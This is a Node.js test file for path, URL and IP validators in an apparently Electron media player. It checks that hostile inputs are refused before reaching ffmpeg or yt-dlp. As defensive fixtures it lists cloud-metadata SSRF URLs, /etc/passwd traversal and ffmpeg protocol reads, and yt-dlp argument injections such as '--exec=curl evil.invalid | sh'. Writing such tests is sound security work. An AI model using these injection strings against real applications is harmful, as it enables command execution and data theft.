'use strict';

// Validators for renderer-supplied paths. See src/main/ipc-validate.js for the threat model —
// these are not path-traversal guards (the user can open any file anyway); they exist to keep
// renderer-named values from reaching ffmpeg's non-file protocols, and to bound reads.

const { test } = require('node:test');
const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { localMediaPath, readTextCapped, containedPath, httpUrl, ipv4 } = require('../src/main/ipc-validate');

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'spritz-validate-'));
const realFile = path.join(tmp, 'Movie.mkv');
fs.writeFileSync(realFile, 'not really a movie');

test('a real local file is accepted and returned', () => {
  assert.strictEqual(localMediaPath(realFile), realFile);
});

test('non-file inputs are refused', () => {
  assert.strictEqual(localMediaPath(tmp), null, 'a directory is not a media file');
  assert.strictEqual(localMediaPath(path.join(tmp, 'nope.mkv')), null, 'missing file');
  for (const bad of [null, undefined, '', 42, {}, [], true]) {
    assert.strictEqual(localMediaPath(bad), null, JSON.stringify(bad) + ' is not a path');
  }
});

test('anything with a URL scheme is refused', () => {
  // This is the point of the guard: these all reach ffmpeg's -i quite happily otherwise, and
  // would let a compromised renderer make the app fetch hosts it cannot reach itself.
  for (const u of ['http://169.254.169.254/latest/meta-data/', 'https://example.invalid/x.mp4',
    'tcp://10.0.0.1:9000', 'concat:/etc/passwd|/etc/hosts', 'subfile,,start,0,end,100,:/etc/passwd',
    'file:///etc/passwd', 'data:video/mp4;base64,AAAA']) {
    assert.strictEqual(localMediaPath(u), null, u + ' must be refused');
  }
});

test('relative paths and null bytes are refused', () => {
  assert.strictEqual(localMediaPath('Movie.mkv'), null, 'no cwd-relative resolution');
  assert.strictEqual(localMediaPath('../Movie.mkv'), null);
  assert.strictEqual(localMediaPath(realFile + '\0.txt'), null, 'null byte truncation');
});

test('readTextCapped returns content under the cap', () => {
  const f = path.join(tmp, 'list.m3u');
  fs.writeFileSync(f, '#EXTM3U\n/a/b.mkv\n');
  assert.strictEqual(readTextCapped(f, 1024), '#EXTM3U\n/a/b.mkv\n');
});

test('readTextCapped refuses a file over the cap instead of allocating it', () => {
  const big = path.join(tmp, 'big.m3u');
  fs.writeFileSync(big, Buffer.alloc(64 * 1024, 0x41));
  assert.strictEqual(readTextCapped(big, 1024), null, 'over cap must be refused, not truncated');
  assert.ok(readTextCapped(big, 128 * 1024).length === 64 * 1024, 'under a larger cap it reads');
});

test('readTextCapped fails closed on bad input', () => {
  assert.strictEqual(readTextCapped(path.join(tmp, 'missing'), 1024), null);
  assert.strictEqual(readTextCapped(tmp, 1024), null, 'a directory is not readable text');
  for (const bad of [null, undefined, '', 42, {}]) {
    assert.strictEqual(readTextCapped(bad, 1024), null);
  }
});

test('cleanup', () => {
  fs.rmSync(tmp, { recursive: true, force: true });
  assert.ok(!fs.existsSync(tmp));
});

// --- containedPath: used by the LAN HTTP server, which is bound to 0.0.0.0 ---

test('containedPath resolves a normal file inside the root', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'spritz-hls-'));
  try {
    assert.strictEqual(containedPath(root, 'seg1.m4s'), path.join(root, 'seg1.m4s'));
    assert.strictEqual(containedPath(root, 'subs/en.vtt'), path.join(root, 'subs', 'en.vtt'));
    // Traversal that stays inside is fine — only where it LANDS matters.
    assert.strictEqual(containedPath(root, 'a/../seg1.m4s'), path.join(root, 'seg1.m4s'));
  } finally { fs.rmSync(root, { recursive: true, force: true }); }
});

test('containedPath refuses anything landing outside the root', () => {
  const root = '/tmp/spritz-hls';
  for (const rel of ['../etc/passwd', '../../etc/passwd', 'a/../../etc/passwd',
    '/etc/passwd', 'subs/../../../../../../etc/passwd']) {
    assert.strictEqual(containedPath(root, rel), null, rel + ' must be refused');
  }
});

test('containedPath is not fooled by a sibling with the root as a prefix', () => {
  // A bare startsWith(root) check would accept this: '/tmp/spritz-hls-evil' does start with
  // '/tmp/spritz-hls'. The separator in the comparison is what rules it out.
  assert.strictEqual(containedPath('/tmp/spritz-hls', '../spritz-hls-evil/x'), null);
});

test('containedPath fails closed on the root itself and bad input', () => {
  assert.strictEqual(containedPath('/tmp/spritz-hls', '.'), null, 'the directory is not a file in it');
  for (const [r, x] of [[null, 'a'], ['/tmp', null], ['', 'a'], ['/tmp', ''], [42, 'a'],
    ['/tmp', 'a\0b']]) {
    assert.strictEqual(containedPath(r, x), null);
  }
});

// --- httpUrl: this string becomes an argv entry for yt-dlp ---

test('httpUrl accepts real web addresses', () => {
  assert.strictEqual(httpUrl('https://youtube.com/watch?v=abc'), 'https://youtube.com/watch?v=abc');
  assert.strictEqual(httpUrl('http://example.com/'), 'http://example.com/');
});

test('httpUrl refuses anything that would arrive as a yt-dlp option', () => {
  // yt-dlp's --exec runs a command and --config-location loads a config that can carry one, so a
  // leading '-' is not a malformed URL, it is an instruction.
  for (const bad of ['--exec=curl evil.invalid | sh', '--config-location=/tmp/evil.conf',
    '-o/tmp/anywhere', '--paths=/tmp', '-', '--']) {
    assert.strictEqual(httpUrl(bad), null, bad + ' must be refused');
  }
});

test('httpUrl refuses non-http schemes and malformed input', () => {
  for (const bad of ['file:///etc/passwd', 'javascript:alert(1)', 'data:text/html,x',
    'magnet:?xt=urn:btih:abc', 'ftp://x/y', 'http://', 'not a url', '', null, undefined, 42, {}]) {
    assert.strictEqual(httpUrl(bad), null, JSON.stringify(bad) + ' must be refused');
  }
});

test('httpUrl refuses whitespace and absurd lengths', () => {
  assert.strictEqual(httpUrl('https://x.invalid/ --exec=id'), null, 'whitespace splits arguments');
  assert.strictEqual(httpUrl('https://x.invalid/\n--exec=id'), null);
  assert.strictEqual(httpUrl('https://x.invalid/' + 'a'.repeat(3000)), null);
});

// --- ipv4: host values that reach a command line ---

test('ipv4 accepts dotted quads and refuses everything else', () => {
  assert.strictEqual(ipv4('192.168.1.42'), '192.168.1.42');
  assert.strictEqual(ipv4('10.0.0.1'), '10.0.0.1');
  for (const bad of ['-x', '--flag', '192.168.1.256', '192.168.1', '192.168.01.1',
    '192.168.1.1 -x', 'tv.local', '0x7f.0.0.1', '::1', '', null, 42]) {
    assert.strictEqual(ipv4(bad), null, JSON.stringify(bad) + ' must be refused');
  }
});
